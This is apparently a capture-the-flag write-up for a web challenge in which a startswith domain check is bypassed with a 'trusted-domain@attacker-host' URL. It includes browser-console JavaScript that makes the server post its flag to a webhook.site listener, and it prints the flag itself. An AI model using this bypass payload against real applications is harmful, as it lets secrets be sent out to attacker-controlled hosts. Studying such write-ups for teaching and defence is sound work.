web
## Vulnerability Analysis
The core logic resides in `app.py`. The application allows users to specify a `domain` to send the flag to, but it enforces a strict check:

```python
ALLOWED_DOMAIN = "https://ctf.cert.unlp.edu.ar"
...
target_domain = request.form.get('domain', '')
if not target_domain.startswith(ALLOWED_DOMAIN):
    return jsonify({"error": "Invalid URL"}), 400
```

If the check passes, the application sends a POST request containing the flag:

```python
requests.post(
    f"{url}/irreversible_receiver",
    ...
    headers={"Flag": flag}
)
```

### The Exploit
The `startswith` check is insufficient because standard URL parsing (and the Python `requests` library) supports **Basic Authentication** in the format `scheme://user:password@host`.

We can construct a URL that satisfies the `startswith` check but directs the traffic to a server we control:
`https://ctf.cert.unlp.edu.ar@our-webhook.com`

In this URL:                                                                                - `https://` is the scheme.                                                                 - `ctf.cert.unlp.edu.ar` is interpreted as the **username**.
- `@` acts as the delimiter.
- `our-webhook.com` is the actual **destination host**.

## Exploitation Steps

1.  **Setup a Listener:**
    We need a public endpoint to receive the HTTP request. Services like `webhook.site` or `requestcatcher.com` work perfectly for this. Let's assume our webhook URL is `https://webhook.site/UUID`.

2.  **Bypass ReCaptcha:**
    The remote server implements Google ReCaptcha. Since the ReCaptcha token is tied to the solver's session/IP, we cannot easily use `curl` from a different machine/server. The easiest way is to execute the exploit directly in the browser's developer console after solving the captcha manually.

3.  **Execution:**
    - Open the challenge URL (`https://flagsender.ctf.cert.unlp.edu.ar/`) in a browser.
    - Open Developer Tools (F12) and go to the Console tab.                                     - **Solve the ReCaptcha** on the page (click the checkbox).                                 - **Immediately** run the following JavaScript code in the console:

    ```javascript
    // Get the fresh token from the just-solved captcha          
    const token = grecaptcha.getResponse();

    // Construct the malicious payload
    // Format: https://ctf.cert.unlp.edu.ar @ YOUR_WEBHOOK
    const attackerUrl = "https://ctf.cert.unlp.edu.ar@webhook.site/YOUR-UUID-HERE";

    const formData = new FormData();
    formData.append("domain", attackerUrl);
    formData.append("g-recaptcha-response", token);

    // Send the request
    fetch("/send_flag", {method: "POST",body: formData})
    .then(r => r.json()).then(console.log)
    .catch(console.error);
    ```

4.  **Retrieve Flag:**
    Check the webhook listener. A POST request will arrive with the flag in the HTTP Headers.                                                                                                                                    **Header:** `Flag: UNLP{ohH-bYp4ss-UrLP4rs3rs-1s-My-p4Ss10n}`

## Flag:`UNLP{ohH-bYp4ss-UrLP4rs3rs-1s-My-p4Ss10n}`